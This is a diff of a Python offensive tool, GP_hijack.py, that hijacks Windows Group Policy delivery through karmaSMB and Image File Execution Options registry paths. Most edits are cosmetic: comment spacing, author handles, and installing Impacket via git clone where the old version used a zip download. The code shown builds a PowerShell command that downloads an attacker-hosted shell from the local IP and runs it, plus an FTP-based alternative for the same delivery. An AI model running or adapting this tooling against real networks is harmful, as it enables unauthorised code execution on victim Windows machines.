@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
 # _authors_:
-#  QSmth (@Qsmthn) 
-#  Shikari (@Lukesparamore)
+#  @whitel1st 
+#  @ShikariSenpai
 
 import textwrap
 import argparse
@@ -23,17 +23,17 @@ print_style = {
 script_name = "GP_hijack.py"
 
 #=== Path to folders/files ===
-#Get user path (~ for root is /usr/root)
+# Get user path (~ for root is /usr/root)
 tilda = os.path.expanduser('~')
 name_working_folder = 'GPhijack'
 path_config_vsftpd = '/etc/vsftpd.conf' 
 path_folder_ftp = '/srv/ftp/'
 path_folder_apache2 = '/var/www/html/'
 
-#path name where we working
+# path name where we working
 working_path = tilda + '/' + name_working_folder + '/'
 
-#=== Files which karmaSMB will be use ===
+# === Files which karmaSMB will be use ===
 all_files =  {
     "INI": 
         {
@@ -90,7 +90,7 @@ all_files =  {
 text_ini_start_version = 10000
 
 #=== Impacket ===
-impacket_source = 'https://www.coresecurity.com/system/files/'
+impacket_source = 'https://github.com/whitel1st/GP_Hijack'
 impacket_file_name = 'impacket-0.9.9.9.zip'
 
 #=== Iptables rules ===
@@ -186,7 +186,7 @@ class setup:
                 """)
 
             register_path = {
-                #IFEO = ImageFileExecutionOptions
+                # IFEO = ImageFileExecutionOptions
                 "IFEO" : "MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\",
                 "Security" : ""
                 }
@@ -194,8 +194,8 @@ class setup:
             if all_about_shell['way'] == "powershell":
                 body = "PowerShell \"-nologo (New-Object System.Net.WebClient).DownloadFile(\'http://" + local_ip + "/" + all_about_shell['name'] + "\',\'" + all_about_shell['name'] + "\'); Start-Process \'" + all_about_shell['name'] +"\'\""
 
-            #Works perfectly if such shell file does not exist
-            #So, to make it works properly - change shell name time to time
+            # Works perfectly if such shell file does not exist
+            # So, to make it works properly - change shell name time to time
             elif all_about_shell['way'] == "ftp":
                 body = "cmd.exe /c \"@echo open " + local_ip + ">" + ftp_script_name + \
                         "&@echo binary>>" + ftp_script_name + \
@@ -348,22 +348,20 @@ class setup:
 
     def stage0_create_dir(self):
         print(print_style['empty'] + "Setup[0] creating directory")
-        os.system("rm -rf " + working_path)
         os.system("mkdir " + working_path) 
  
     def stage1and2_impacket(self,impacket_source,impacket_file_name):
         print(print_style['empty'] + "Setup[1] downloading impacket")
-        os.system("wget " + impacket_source + impacket_file_name + " -P " + working_path)       
+        os.system("git clone " + impacket_source + " " + working_path + "impacket/")
  
-        print(print_style['empty'] + "Setup[2] unzip and install impacket")
-        os.system("unzip "+ working_path + impacket_file_name + " -d " + working_path)
+        print(print_style['empty'] + "Setup[2] install impacket")
         os.chdir(working_path + "impacket/")
-        os.system("python setup.py install")
+        os.system("pip install .")
     
     def stage3_payload(self,all_about_shell):
         print(print_style['empty'] + "Setup[3] payload")
 
-        #Way to deliver
+        # Way to deliver
         print(print_style['question'] + "Choose how your shell your will be delivered. [default is 0]")
         print(print_style['tab'] + "0. Via PowerShell and Apache")
         print(print_style['tab'] + "1. Via FTP (vsftpd)")
